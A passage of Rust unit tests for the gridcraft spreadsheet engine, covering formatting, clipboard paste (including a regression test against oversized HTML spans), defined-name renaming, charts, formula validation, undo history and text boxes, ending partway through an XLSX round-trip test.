use gridcraft_core::{CellRef, Value};
use serde_json::json;

use crate::Session;

thread_local! {
    /// Copies of a document's undo and redo history `execute` has taken on this thread.
    pub(crate) static HISTORY_COPIES: std::cell::Cell<usize> = const { std::cell::Cell::new(0) };
}

fn s() -> Session {
    let mut s = Session::new();
    s.new_workbook();
    s
}

fn v(s: &Session, a: &str) -> Value {
    s.doc().unwrap().wb.active().unwrap().value(CellRef::parse(a).unwrap())
}

#[test]
fn format_cells_reading_order_survives_undo_and_xlsx() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "مرحبا 123 ABC"})).unwrap();
    s.execute("home.bold", json!({"range": "A1"})).unwrap();
    s.execute("home.formatCells", json!({"range": "A1", "style": {"align": {"reading_order": "RightToLeft"}}})).unwrap();
    let alignment = |s: &Session| {
        let d = s.doc().unwrap();
        let style = d.wb.styles.get(d.wb.active().unwrap().style_id(CellRef::new(0, 0)));
        assert!(style.font.bold);
        serde_json::to_value(style.align).unwrap()
    };
    assert_eq!(alignment(&s)["reading_order"], "RightToLeft");
    s.execute("edit.undo", json!({})).unwrap();
    assert!(alignment(&s)["reading_order"].is_null());
    s.execute("edit.redo", json!({})).unwrap();
    assert_eq!(alignment(&s)["reading_order"], "RightToLeft");
    for order in [json!("invalid"), json!(2)] {
        assert!(s.execute("home.formatCells", json!({"range": "A1", "style": {"align": {"reading_order": order}}})).is_err());
        assert_eq!(alignment(&s)["reading_order"], "RightToLeft");
    }
    let wb = &s.doc().unwrap().wb;
    let (reopened, _) = gridcraft_xlsx::read_xlsx(&gridcraft_xlsx::write_xlsx(wb).unwrap()).unwrap();
    let cell = CellRef::new(0, 0);
    assert_eq!(reopened.styles.get(reopened.active().unwrap().style_id(cell)), wb.styles.get(wb.active().unwrap().style_id(cell)));
    assert_eq!(reopened.active().unwrap().value(cell), Value::text("مرحبا 123 ABC"));
    for order in ["LeftToRight", "Context"] {
        s.execute("home.formatCells", json!({"range": "A1", "style": {"align": {"reading_order": order}}})).unwrap();
        assert_eq!(alignment(&s)["reading_order"], order);
    }
    s.execute("home.formatCells", json!({"range": "A1", "style": {"align": {"reading_order": null}}})).unwrap();
    assert!(alignment(&s)["reading_order"].is_null());
    s.execute("edit.undo", json!({})).unwrap();
    assert_eq!(alignment(&s)["reading_order"], "Context");
    s.execute("edit.redo", json!({})).unwrap();
    assert!(alignment(&s)["reading_order"].is_null());
}

#[test]
fn entering_empty_cells_preserves_whole_sheet_formatting() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "existing"})).unwrap();
    s.execute("selection.set", json!({"range": "A1:XFD1048576"})).unwrap();
    s.execute("home.alignCenter", json!({})).unwrap();
    let border = gridcraft_model::BorderLine { style: gridcraft_model::BorderStyle::Thin, color: gridcraft_model::Color::Auto };
    s.execute("home.formatCells", json!({"style": {"borders": {"top": border, "bottom": border, "left": border, "right": border}}})).unwrap();
    let expected = {
        let d = s.doc().unwrap();
        d.wb.styles.get(d.wb.active().unwrap().style_id(CellRef::parse("B1").unwrap())).clone()
    };
    assert_eq!(expected.align.h, gridcraft_model::HAlign::Center);
    for (cell, input) in [("A1", "edited"), ("B1", "new"), ("C1", "=1+2"), ("XFD1048576", "edge")] {
        s.execute("cell.set", json!({"cell": cell, "input": input})).unwrap();
        let d = s.doc().unwrap();
        assert_eq!(d.wb.styles.get(d.wb.active().unwrap().style_id(CellRef::parse(cell).unwrap())), &expected, "{cell}");
    }
    s.execute("range.setValues", json!({"range": "D1", "values": [["text", 7, true]]})).unwrap();
    for cell in ["D1", "E1", "F1"] {
        let d = s.doc().unwrap();
        assert_eq!(d.wb.styles.get(d.wb.active().unwrap().style_id(CellRef::parse(cell).unwrap())), &expected, "{cell}");
    }
    s.execute("edit.undo", json!({})).unwrap();
    assert!(v(&s, "D1").is_empty());
    s.execute("edit.redo", json!({})).unwrap();
    let d = s.doc().unwrap();
    assert_eq!(d.wb.styles.get(d.wb.active().unwrap().style_id(CellRef::parse("D1").unwrap())), &expected);
    assert_eq!(d.wb.active().unwrap().cells.len(), 7);
    let (reopened, _) = gridcraft_xlsx::read_xlsx(&gridcraft_xlsx::write_xlsx(&d.wb).unwrap()).unwrap();
    for cell in ["A1", "B1", "C1", "D1", "E1", "F1", "G1", "XFD1048576"] {
        assert_eq!(
            reopened.styles.get(reopened.active().unwrap().style_id(CellRef::parse(cell).unwrap())),
            &expected,
            "{cell} after XLSX round trip"
        );
    }
}

#[test]
fn pasted_currency_text_keeps_the_number_from_the_clipboard_html() {
    // #257: "Rp10,000.00" copied from Excel for the web / LibreOffice Calc pasted as text. Their
    // clipboard HTML records the number (x:num, sdval); paste keeps it and shows the same text.
    let mut s = s();
    let text = "Rp10,000.00\tRp2,500.50\tLabel\n";
    let html =
        r#"<table><tr><td x:num="10000">Rp10,000.00</td><td sdval="2500.5" sdnum="1033;0;x"><font>Rp2,500.50</font></td><td>Label</td></tr></table>"#;
    s.execute("edit.paste", json!({"at": "A1", "text": text, "html": html})).unwrap();
    assert_eq!(v(&s, "A1"), Value::number(10000.0));
    assert_eq!(v(&s, "B1"), Value::number(2500.5));
    assert_eq!(v(&s, "C1"), Value::text("Label"));
    let d = s.doc().unwrap();
    let sh = d.wb.active().unwrap();
    assert_eq!(crate::display::cell_text(&d.wb, sh, CellRef::parse("A1").unwrap()), "Rp10,000.00");
    assert_eq!(crate::display::cell_text(&d.wb, sh, CellRef::parse("B1").unwrap()), "Rp2,500.50");

    // HTML that doesn't show the same text (left over from another copy) changes nothing; without
    // HTML the text stays text, as typing it would in an en-US locale.
    let stale = r#"<table><tr><td x:num="7">Rp7.00</td></tr></table>"#;
    s.execute("edit.paste", json!({"at": "A3", "text": "Rp10,000.00", "html": stale})).unwrap();
    s.execute("edit.paste", json!({"at": "A4", "text": "Rp10,000.00"})).unwrap();
    assert_eq!(v(&s, "A3"), Value::text("Rp10,000.00"));
    assert_eq!(v(&s, "A4"), Value::text("Rp10,000.00"));
}

#[test]
fn pasting_html_with_huge_spans_reads_only_the_text_shape() {
    // #2171: a web page's clipboard HTML with enormous colspan/rowspan crashed paste (OOM). The
    // HTML is now read only as far as the tab-separated text reaches; its numbers still apply.
    let mut s = s();
    let row = "<tr><td colspan=16384 rowspan=1048576 x:num='5'>Rp5</td><td colspan=999999999999>x</td></tr>";
    let html = format!("<table>{}</table>", row.repeat(100_000));
    let r = s.execute("edit.paste", json!({"at": "B2", "text": "Rp5\tnext\nlast", "html": html})).unwrap();
    assert_eq!(r, json!({"rows": 2, "cols": 2}));
    assert_eq!(v(&s, "B2"), Value::number(5.0));
    assert_eq!(v(&s, "C2"), Value::text("next"));
    assert_eq!(v(&s, "B3"), Value::text("last"));
}

#[test]
fn editing_a_name_renames_it_in_formulas() {
    // Name Manager › Edit…: `oldName` edits the name in place; formulas that use it follow.
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "21"})).unwrap();
    s.execute("formulas.defineName", json!({"name": "Price", "refersTo": "=Sheet1!$A$1"})).unwrap();
    s.execute("formulas.defineName", json!({"name": "Other", "refersTo": "=1"})).unwrap();
    s.execute("cell.set", json!({"cell": "B1", "input": "=Price*2"})).unwrap();
    let err = s.execute("formulas.defineName", json!({"name": "Other", "refersTo": "=Sheet1!$A$1", "oldName": "Price"}));
    assert!(err.is_err(), "renaming onto another existing name is refused");
    s.execute("formulas.defineName", json!({"name": "Cost", "refersTo": "=Sheet1!$A$1", "comment": "unit", "oldName": "Price"})).unwrap();
    let d = s.doc().unwrap();
    let names: Vec<&str> = d.wb.names.iter().map(|n| n.name.as_str()).collect();
    assert_eq!(names, ["Other", "Cost"]);
    let b1 = d.wb.active().unwrap().cell(CellRef::parse("B1").unwrap()).and_then(|c| c.formula.clone()).unwrap();
    assert_eq!(b1.text, "Cost*2");
    assert_eq!(v(&s, "B1"), Value::number(42.0));
    assert!(s.execute("formulas.defineName", json!({"name": "X", "oldName": "Missing"})).is_err());
}

/// A LET or LAMBDA local is not the defined name: renaming the name leaves a local of the same
/// name alone, in cells and in rules.
#[test]
fn renaming_a_name_leaves_let_and_lambda_locals_alone() {
    let mut s = s();
    s.execute("formulas.defineName", json!({"name": "Rate", "refersTo": "=2"})).unwrap();
    s.execute("cell.set", json!({"cell": "A1", "input": "=LET(Rate, 3, Rate*10)+Rate"})).unwrap();
    s.execute("cell.set", json!({"cell": "A2", "input": "=LAMBDA(Rate, Rate+1)(Rate)"})).unwrap();
    s.execute(
        "home.conditionalFormat",
        json!({"range": "B1:B3", "rule": {"type": "expression", "formula": "=LET(Rate, 1, Rate)<Rate"}, "style": {"fill": "#FFC7CE"}}),
    )
    .unwrap();
    s.execute("formulas.defineName", json!({"name": "Fee", "refersTo": "=2", "oldName": "Rate"})).unwrap();
    let formula =
        |s: &Session, at: &str| s.doc().unwrap().wb.sheets[0].cell(CellRef::parse(at).unwrap()).and_then(|c| c.formula.clone()).unwrap().text.clone();
    assert_eq!(formula(&s, "A1"), "LET(Rate,3,Rate*10)+Fee");
    assert_eq!(formula(&s, "A2"), "LAMBDA(Rate,Rate+1)(Fee)");
    assert_eq!(v(&s, "A1"), Value::number(32.0));
    let rule = match &s.doc().unwrap().wb.sheets[0].cond_formats[0].rule {
        gridcraft_model::CfRule::Expression { formula, .. } => formula.trim_start_matches('=').to_string(),
        other => panic!("{other:?}"),
    };
    assert_eq!(rule, "LET(Rate,1,Rate)<Fee");
}

/// Renaming a name to one a LET local already uses where the name occurs would make the local
/// capture it: the rename is refused and changes nothing.
#[test]
fn renaming_a_name_onto_a_let_local_is_refused() {
    let mut s = s();
    s.execute("formulas.defineName", json!({"name": "Rate", "refersTo": "=2"})).unwrap();
    s.execute("data.validation", json!({"range": "C1:C3", "type": "custom", "formula1": "=LET(Total, 1, Rate*Total)>0"})).unwrap();
    let before = s.doc().unwrap().wb.clone();
    let err = s.execute("formulas.defineName", json!({"name": "Total", "refersTo": "=2", "oldName": "Rate"}));
    assert!(err.is_err(), "the LET local would capture the renamed name");
    assert!(std::sync::Arc::ptr_eq(&s.doc().unwrap().wb, &before) || *s.doc().unwrap().wb == *before);
    assert_eq!(s.doc().unwrap().wb.names[0].name, "Rate");
    assert_eq!(s.doc().unwrap().wb.sheets[0].validations[0].f1.trim_start_matches('='), "LET(Total, 1, Rate*Total)>0");
}

/// A sheet-level name's unqualified references are read on its sheet, so they move with edits
/// there, and stay put for edits on other sheets.
#[test]
fn a_sheet_level_name_follows_edits_on_its_sheet() {
    let mut s = s();
    s.execute("home.insertSheet", json!({"name": "Other", "before": 1})).unwrap();
    s.execute("range.setValues", json!({"range": "Sheet1!A2", "values": [[5]]})).unwrap();
    s.execute("formulas.defineName", json!({"name": "LocalRef", "refersTo": "=$A$2", "scope": "Sheet1"})).unwrap();
    let formula = |s: &Session| s.doc().unwrap().wb.names.iter().find(|n| n.name == "LocalRef").unwrap().formula.clone();
    s.execute("home.insertRows", json!({"rows": "1:1", "sheet": "Other"})).unwrap();
    assert_eq!(formula(&s), "$A$2");
    s.execute("home.insertRows", json!({"rows": "1:1", "sheet": "Sheet1"})).unwrap();
    assert_eq!(formula(&s), "$A$3");
    s.execute("sheet.activate", json!({"sheet": 0})).unwrap();
    s.execute("cell.set", json!({"cell": "C1", "input": "=LocalRef"})).unwrap();
    assert_eq!(v(&s, "C1"), Value::number(5.0));
}

#[test]
fn chart_recommendations_follow_the_data_shape() {
    // #215: Recommended Charts lists chart types for the data; programmatic insert stays dialog-free.
    let mut s = s();
    let kinds = |s: &mut Session, range: &str| -> Vec<String> {
        let r = s.execute("insert.chartRecommendations", json!({"range": range})).unwrap();
        r.as_array().unwrap().iter().map(|x| format!("{}{}", x["type"].as_str().unwrap(), x["subtype"].as_str().unwrap())).collect()
    };
    s.execute("range.setValues", json!({"range": "A1", "values": [["Fruit", "Sales"], ["Apples", 5], ["Pears", 3], ["Plums", 2]]})).unwrap();
    assert_eq!(kinds(&mut s, "A1:B4"), ["column", "bar", "pie", "doughnut", "linemarkers"]);
    s.execute("range.setValues", json!({"range": "D1", "values": [[1, 2], [2, 4.5], [3, 5.5], [4, 9]]})).unwrap();
    assert_eq!(kinds(&mut s, "D1:E4").first().map(String::as_str), Some("scatter"), "two numeric columns: scatter first");
    s.execute("range.setValues", json!({"range": "G1", "values": [["Q", "North", "South"], ["Q1", 1, -2], ["Q2", 3, 4]]})).unwrap();
    let multi = kinds(&mut s, "G1:I3");
    assert_eq!(multi.first().map(String::as_str), Some("column"));
    assert!(!multi.iter().any(|k| k == "pie"), "several series: no pie");
    assert!(s.execute("insert.chartRecommendations", json!({"range": "K1:K3"})).is_err(), "no numbers, no chart");

    // Without a type the command inserts the first recommendation; with one, that type.
    s.execute("insert.recommendedCharts", json!({"range": "D1:E4"})).unwrap();
    s.execute("insert.recommendedCharts", json!({"range": "A1:B4", "type": "pie"})).unwrap();
    let d = s.doc().unwrap();
    let kinds: Vec<_> = d.wb.active().unwrap().charts.iter().map(|c| c.kind).collect();
    assert_eq!(kinds, [gridcraft_model::ChartKind::Scatter, gridcraft_model::ChartKind::Pie]);
    assert!(s.ui_requests.is_empty(), "programmatic calls never open the dialog");
}

#[test]
fn chart_uses_text_first_area_as_categories_for_later_areas() {
    let mut s = s();
    s.execute(
        "range.setValues",
        json!({"range": "A1", "values": [["Mes", "x", "y", "z", "Ventas"], ["Ene", 1, 1, 1, 10], ["Feb", 1, 1, 1, 20], ["Mar", 1, 1, 1, 30], ["Abr", 1, 1, 1, 40]]}),
    )
    .unwrap();

    s.execute("insert.chart", json!({"range": "A1:A5,E1:E5", "type": "pie", "at": "G2"})).unwrap();
    let multi = s.doc().unwrap().wb.active().unwrap().charts.last().unwrap().clone();
    assert_eq!(multi.series.len(), 1);
    assert_eq!(multi.series[0].name.as_deref(), Some("Sheet1!$E$1"));
    assert_eq!(multi.series[0].categories.as_deref(), Some("Sheet1!$A$2:$A$5"));
    assert_eq!(multi.series[0].values, "Sheet1!$E$2:$E$5");

    s.execute("insert.chart", json!({"range": "D1:E5", "type": "pie", "at": "G20"})).unwrap();
    let contiguous = s.doc().unwrap().wb.active().unwrap().charts.last().unwrap().clone();
    assert_eq!(contiguous.series.len(), 2);
    assert_eq!(contiguous.series[0].name.as_deref(), Some("Sheet1!$D$1"));
    assert_eq!(contiguous.series[0].values, "Sheet1!$D$2:$D$5");
    assert_eq!(contiguous.series[1].name.as_deref(), Some("Sheet1!$E$1"));
    assert_eq!(contiguous.series[1].values, "Sheet1!$E$2:$E$5");
}

#[test]
fn chart_category_axis_from_blank_corner_and_select_data() {
    // #287: numeric X values must be the category axis, not a series of their own.
    let mut s = s();
    let series = |s: &Session| -> Vec<(Option<String>, String)> {
        let d = s.doc().unwrap();
        d.wb.active().unwrap().charts.last().unwrap().series.iter().map(|x| (x.categories.clone(), x.values.clone())).collect()
    };
    // A blank top-left cell marks the first column as category labels, numbers or not.
    s.execute("range.setValues", json!({"range": "A1", "values": [[null, "Sales"], [2020, 5], [2021, 7], [2022, 9]]})).unwrap();
    s.execute("insert.chart", json!({"range": "A1:B4", "type": "line"})).unwrap();
    assert_eq!(series(&s), [(Some("Sheet1!$A$2:$A$4".to_string()), "Sheet1!$B$2:$B$4".to_string())]);

    // With a "Year" header the year column is a series, as before; Select Data fixes it:
    // Horizontal (Category) Axis Labels and Remove on the year series.
    s.execute("range.setValues", json!({"range": "D1", "values": [["Year", "Sales"], [2020, 5], [2021, 7], [2022, 9]]})).unwrap();
    s.execute("insert.chart", json!({"range": "D1:E4", "type": "line"})).unwrap();
    assert_eq!(series(&s).len(), 2);
    assert!(s.execute("chart.selectData", json!({})).is_err(), "nothing to change");
    assert!(s.execute("chart.selectData", json!({"categories": "not a range"})).is_err());
    s.execute("chart.selectData", json!({"categories": "=D2:D4", "removeSeries": [0, 7]})).unwrap();
    assert_eq!(series(&s), [(Some("Sheet1!$D$2:$D$4".to_string()), "Sheet1!$E$2:$E$4".to_string())]);
    let d = s.doc().unwrap();
    let sh = d.wb.active().unwrap();
    let data = gridcraft_chart::resolve(&d.wb, d.wb.active_sheet(), sh.charts.last().unwrap());
    assert_eq!(data.categories, ["2020", "2021", "2022"]);
    // The last series can't be removed; "" clears the labels.
    s.execute("chart.selectData", json!({"categories": "", "removeSeries": [0]})).unwrap();
    assert_eq!(series(&s), [(None, "Sheet1!$E$2:$E$4".to_string())]);
}

#[test]
fn entry_and_text_paste_use_inherited_formats_and_cell_overrides() {
    let mut s = s();
    s.execute("home.bold", json!({"range": "B:B", "on": true})).unwrap();
    s.execute("home.formatCells", json!({"range": "3:3", "style": {"num_fmt": "@", "font": {"italic": true}}})).unwrap();
    s.execute("home.fontColor", json!({"range": "B3", "color": "#FF0000"})).unwrap();
    let expected = {
        let d = s.doc().unwrap();
        d.wb.styles.get(d.wb.active().unwrap().style_id(CellRef::parse("B3").unwrap())).clone()
    };
    s.execute("cell.set", json!({"cell": "B3", "input": "=1+2"})).unwrap();
    s.execute("cell.set", json!({"cell": "C3", "input": "00123"})).unwrap();
    s.execute("edit.paste", json!({"at": "D3", "text": "=2+3\t00456"})).unwrap();
    assert_eq!(v(&s, "B3"), Value::text("=1+2"));
    assert_eq!(v(&s, "C3"), Value::text("00123"));
    assert_eq!(v(&s, "D3"), Value::text("=2+3"));
    assert_eq!(v(&s, "E3"), Value::text("00456"));
    s.execute("cell.set", json!({"cell": "B4", "input": "12%"})).unwrap();
    let d = s.doc().unwrap();
    let sh = d.wb.active().unwrap();
    assert_eq!(d.wb.styles.get(sh.style_id(CellRef::parse("B3").unwrap())), &expected);
    for cell in ["C3", "D3", "E3"] {
        let st = d.wb.styles.get(sh.style_id(CellRef::parse(cell).unwrap()));
        assert!(st.font.italic);
        assert!(!st.font.bold, "row style takes precedence over column style");
        assert_eq!(st.num_fmt.as_str(), "@");
    }
    let percent = d.wb.styles.get(sh.style_id(CellRef::parse("B4").unwrap()));
    assert!(percent.font.bold);
    assert_ne!(percent.num_fmt.as_str(), "General");
}

#[test]
fn enter_values_and_formulas() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "10"})).unwrap();
    s.execute("cell.set", json!({"cell": "A2", "input": "32"})).unwrap();
    s.execute("cell.set", json!({"cell": "A3", "input": "=sum(a1:a2"})).unwrap();
    assert_eq!(v(&s, "A3"), Value::Number(42.0));
    assert!(s.execute("cell.set", json!({"cell": "A4", "input": "=1+*2"})).is_err());
    s.execute("cell.set", json!({"cell": "B1", "input": "12%"})).unwrap();
    let d = s.doc().unwrap();
    let sh = d.wb.active().unwrap();
    assert_eq!(crate::display::cell_text(&d.wb, sh, CellRef::parse("B1").unwrap()), "12%");
}

#[test]
fn formulas_with_the_wrong_argument_count_are_refused_on_entry() {
    // #363: =DATEDIF(start, end) was stored and showed #VALUE!. Like Excel, entry refuses it and
    // the message gives the signature, so the missing unit argument is visible.
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "kept"})).unwrap();
    for (input, word) in [
        ("=DATEDIF(DATE(2024,1,1),DATE(2024,3,15))", "few"),
        ("=1+DATE(2024,1)", "few"),
        ("=SUM()", "few"),
        ("=IFERROR(1,LEFT(\"a\",1,2,3))", "many"),
        ("=datedif(1,2,\"D\",4)", "many"),
    ] {
        let e = s.execute("cell.set", json!({"cell": "A1", "input": input})).unwrap_err().to_string();
        assert!(e.contains(&format!("too {word} arguments")), "{input}: {e}");
        assert_eq!(v(&s, "A1"), Value::text("kept"), "{input} must not replace the cell");
    }
    let e = s.execute("cell.set", json!({"cell": "A1", "input": "=DATEDIF(1,2)"})).unwrap_err().to_string();
    assert!(e.contains("DATEDIF(start_date, end_date, unit)"), "{e}");
    // Correct counts, optional arguments left empty, special forms, LAMBDA names and unknown
    // functions (#NAME?) still enter.
    s.execute("formulas.defineName", json!({"name": "TWICE", "refersTo": "=LAMBDA(x,x*2)"})).unwrap();
    for (cell, input) in [
        ("B1", "=DATEDIF(DATE(2024,1,1),DATE(2024,3,15),\"D\")"),
        ("B2", "=IF(TRUE,1)"),
        ("B3", "=LET(a,1,b,2,a+b)"),
        ("B4", "=TWICE(4)"),
        ("B5", "=NOSUCHFUNCTION(1,2,3)"),
        ("B6", "=ROUND(2.5,)"),
    ] {
        s.execute("cell.set", json!({"cell": cell, "input": input})).unwrap_or_else(|e| panic!("{input}: {e}"));
    }
    assert_eq!(v(&s, "B1"), Value::Number(74.0));
    assert_eq!(v(&s, "B4"), Value::Number(8.0));
    // Pasted text that isn't a valid formula stays text, as it does for a parse error.
    s.execute("edit.paste", json!({"at": "C1", "text": "=DATEDIF(1,2)\n"})).unwrap();
    assert_eq!(v(&s, "C1"), Value::text("=DATEDIF(1,2)"));
}

#[test]
fn evaluate_refuses_what_entry_refuses_and_says_why() {
    // `formulas.evaluate` (the CLI's `eval`, MCP's evaluate_formula) gave #NAME? for any formula
    // that didn't parse, which hid the cause: `=SUM(1;2)`, with the `;` a French or German Excel
    // uses, looked like an unknown function.
    let mut s = s();
    let eval = |s: &mut Session, f: &str| s.execute("formulas.evaluate", json!({"formula": f}));
    let e = eval(&mut s, "=SUM(1;2)").unwrap_err().to_string();
    assert!(e.contains("There's a problem with this formula") && e.contains("expected `,`"), "{e}");
    let e = eval(&mut s, "=DATEDIF(1,2)").unwrap_err().to_string();
    assert!(e.contains("too few arguments"), "{e}");
    // What entry accepts evaluates: an unknown function is #NAME?, as in Excel, missing closing
    // parentheses are added, and the `=` is optional.
    assert_eq!(eval(&mut s, "=SOMME(1,2)").unwrap(), json!({"error": "#NAME?"}));
    assert_eq!(eval(&mut s, "=SUM(1,2").unwrap(), json!(3.0));
    assert_eq!(eval(&mut s, "1/4").unwrap(), json!(0.25));
}

#[test]
fn an_incomplete_formula_is_refused_with_an_error_about_what_was_typed() {
    // #2030: `=1+` said "unexpected `)`", although no `)` was typed: entry closes missing
    // parentheses and reported the error of its last retry.
    let mut s = s();
    for (input, msg) in [("=1+", "unexpected end of formula"), ("=SUM(1,+", "unexpected end of formula")] {
        let e = s.execute("cell.set", json!({"cell": "A1", "input": input})).unwrap_err().to_string();
        assert!(e.contains("problem with this formula") && e.contains(msg), "{input}: {e}");
        assert!(!e.contains('`'), "{input}: {e}");
    }
    // Missing closing parentheses are still added.
    s.execute("cell.set", json!({"cell": "A1", "input": "=SUM(1,(2+3"})).unwrap();
    assert_eq!(v(&s, "A1"), Value::Number(6.0));
}

#[test]
fn undo_redo() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "1"})).unwrap();
    s.execute("cell.set", json!({"cell": "A1", "input": "2"})).unwrap();
    s.execute("edit.undo", json!({})).unwrap();
    assert_eq!(v(&s, "A1"), Value::Number(1.0));
    s.execute("edit.redo", json!({})).unwrap();
    assert_eq!(v(&s, "A1"), Value::Number(2.0));
    assert!(s.doc().unwrap().is_dirty());
}

#[test]
fn redo_selects_the_redone_cell() {
    // #1855: type into A1..A3, click A1, undo, redo: the selection follows the edit to A3.
    let mut s = s();
    for (cell, text) in [("A1", "first"), ("A2", "second"), ("A3", "third")] {
        s.execute("selection.set", json!({"cell": cell})).unwrap();
        s.execute("cell.set", json!({"cell": cell, "input": text})).unwrap();
    }
    s.execute("selection.set", json!({"cell": "A1"})).unwrap();
    s.execute("edit.undo", json!({})).unwrap();
    assert_eq!(s.doc().unwrap().selection.a1(), "A3");
    s.execute("edit.redo", json!({})).unwrap();
    assert_eq!(v(&s, "A3"), Value::from("third"));
    assert_eq!(s.doc().unwrap().selection.a1(), "A3");
}

#[test]
fn bulk_formula_history_is_bounded_and_latest_edit_still_undoes() {
    use std::sync::Arc;

    use gridcraft_model::{Cell, Formula, Workbook};

    let mut current = Arc::new(Workbook::new());
    let mut history = Vec::new();
    let budget = 64 * 1024;
    for version in 0..5 {
        let previous = current.clone();
        let mut next = (*previous).clone();
        let sheet = next.sheet_mut(0).unwrap();
        for row in 0..128 {
            sheet.cells.set(CellRef::new(row, 0), Cell::formula(Formula::new(&format!("=B{}+{}", row + 1, version))));
        }
        current = Arc::new(next);
        crate::push_history_with_budget(&mut history, format!("edit {version}"), previous, &current, crate::Selection::default(), budget);
    }
    assert!(history.len() < 5, "bulk edits should evict old steps before reaching the count limit");
    assert_eq!(history.last().unwrap().label, "edit 4");
    assert!(history.len() == 1 || history.iter().map(|e| e.retained_bytes).sum::<usize>() <= budget);

    let mut session = s();
    let doc = session.doc_mut().unwrap();
    doc.wb = current;
    doc.undo = history;
    session.execute("edit.undo", json!({})).unwrap();
    assert_eq!(session.doc().unwrap().wb.active().unwrap().cells.get(CellRef::new(0, 0)).unwrap().formula.as_ref().unwrap().text, "B1+3");
    session.execute("edit.redo", json!({})).unwrap();
    assert_eq!(session.doc().unwrap().wb.active().unwrap().cells.get(CellRef::new(0, 0)).unwrap().formula.as_ref().unwrap().text, "B1+4");
}

#[test]
fn small_edits_keep_the_full_undo_depth() {
    let mut session = s();
    for number in 0..100 {
        session.execute("cell.set", json!({"cell": "A1", "input": number.to_string()})).unwrap();
    }
    assert_eq!(session.doc().unwrap().undo.len(), 100);
    session.execute("edit.undo", json!({"steps": 100})).unwrap();
    assert_eq!(v(&session, "A1"), Value::Empty);
}

#[test]
fn shape_text_edit_undo_redo_and_noop() {
    let mut s = s();
    let id = s.execute("insert.textBox", json!({"at": "C4", "width": 210, "height": 90, "text": "Original"})).unwrap()["shape"].clone();
    let original = s.doc().unwrap().wb.active().unwrap().shapes[0].clone();
    let mut changed = original.clone();
    changed.text = "First line\n\nSecond line & <text>".into();
    let undo_len = s.doc().unwrap().undo.len();
    s.execute("shape.setText", json!({"id": id, "text": changed.text})).unwrap();
    assert_eq!(s.doc().unwrap().wb.active().unwrap().shapes[0], changed);
    assert_eq!(s.doc().unwrap().undo.len(), undo_len + 1);
    s.execute("edit.undo", json!({})).unwrap();
    assert_eq!(s.doc().unwrap().wb.active().unwrap().shapes[0], original);

    let before_noop = s.doc().unwrap().wb.clone();
    let revision = s.doc().unwrap().revision;
    s.execute("shape.setText", json!({"id": id, "text": "Original"})).unwrap();
    assert!(std::sync::Arc::ptr_eq(&s.doc().unwrap().wb, &before_noop));
    assert_eq!(s.doc().unwrap().revision, revision);
    assert_eq!(s.doc().unwrap().undo.len(), undo_len);
    assert_eq!(s.doc().unwrap().redo.len(), 1);
    s.execute("edit.redo", json!({})).unwrap();
    assert_eq!(s.doc().unwrap().wb.active().unwrap().shapes[0], changed);

    s.execute("shape.setText", json!({"id": id, "text": ""})).unwrap();
    assert_eq!(s.doc().unwrap().wb.active().unwrap().shapes[0].text, "");
    s.execute("edit.undo", json!({})).unwrap();
    assert_eq!(s.doc().unwrap().wb.active().unwrap().shapes[0], changed);
}

#[test]
fn shape_text_rejects_invalid_targets_and_params() {
    let mut s = s();
    let id = s.execute("insert.textBox", json!({"text": "Original"})).unwrap()["shape"].clone();
    let rectangle = s.execute("insert.shape", json!({"kind": "rectangle", "text": "Rectangle"})).unwrap()["shape"].clone();
    let before = s.doc().unwrap().wb.clone();
    let undo_len = s.doc().unwrap().undo.len();
    for params in [
        json!({}),
        json!({"id": id}),
        json!({"id": id, "text": 12}),
        json!({"id": "1", "text": "bad id"}),
        json!({"id": -1, "text": "bad id"}),
        json!({"id": 1.5, "text": "bad id"}),
        json!({"id": u64::from(u32::MAX) + 1, "text": "bad id"}),
        json!({"id": 999, "text": "unknown"}),
        json!({"id": rectangle, "text": "not a text box"}),
    ] {
        assert!(matches!(s.execute("shape.setText", params), Err(crate::EngineError::BadParams { .. })));
        assert!(std::sync::Arc::ptr_eq(&s.doc().unwrap().wb, &before));
        assert_eq!(s.doc().unwrap().undo.len(), undo_len);
    }
    s.execute("home.insertSheet", json!({})).unwrap();
    assert!(matches!(s.execute("shape.setText", json!({"id": id, "text": "wrong sheet"})), Err(crate::EngineError::BadParams { .. })));
    assert_eq!(s.doc().unwrap().wb.sheet(0).unwrap().shapes[0].text, "Original");
    assert!(s.doc().unwrap().wb.active().unwrap().shapes.is_empty());
}

#[test]
fn shape_text_respects_sheet_protection() {
    let mut s = s();
    let id = s.execute("insert.textBox", json!({"text": "Original"})).unwrap()["shape"].clone();
    s.execute("review.protectSheet", json!({})).unwrap();
    let before = s.doc().unwrap().wb.clone();
    let undo_len = s.doc().unwrap().undo.len();
    assert!(s.execute("shape.setText", json!({"id": id, "text": "Changed"})).is_err());
    assert!(std::sync::Arc::ptr_eq(&s.doc().unwrap().wb, &before));
    assert_eq!(s.doc().unwrap().undo.len(), undo_len);
    s.execute("review.unprotectSheet", json!({})).unwrap();
    s.execute("shape.setText", json!({"id": id, "text": "Changed"})).unwrap();
    assert_eq!(s.doc().unwrap().wb.active().unwrap().shapes[0].text, "Changed");
}

#[test]
fn shape_text_is_capped_like_a_cell() {
    let mut s = s();
    let id = s.execute("insert.textBox", json!({"text": "Original"})).unwrap()["shape"].clone();
    // The cap counts characters, not bytes.
    let longest = "é".repeat(32_767);
    s.execute("shape.setText", json!({"id": id, "text": longest})).unwrap();
    assert_eq!(s.doc().unwrap().wb.active().unwrap().shapes[0].text.chars().count(), 32_767);
    let undo_len = s.doc().unwrap().undo.len();
    let too_long = "x".repeat(32_768);
    assert!(matches!(s.execute("shape.setText", json!({"id": id, "text": too_long})), Err(crate::EngineError::BadParams { .. })));
    assert_eq!(s.doc().unwrap().wb.active().unwrap().shapes[0].text.chars().count(), 32_767);
    assert_eq!(s.doc().unwrap().undo.len(), undo_len);
}

#[test]
fn shape_text_edit_survives_xlsx_roundtrip() {
    let mut s = s();
    s.execute("insert.textBox", json!({"text": "Imported"})).unwrap();
    let saved = s.execute("file.saveBytes", json!({"format": "xlsx"})).unwrap();
    s.execute("file.open", json!({"name": "text-box.xlsx", "base64": saved["base64"]})).unwrap();
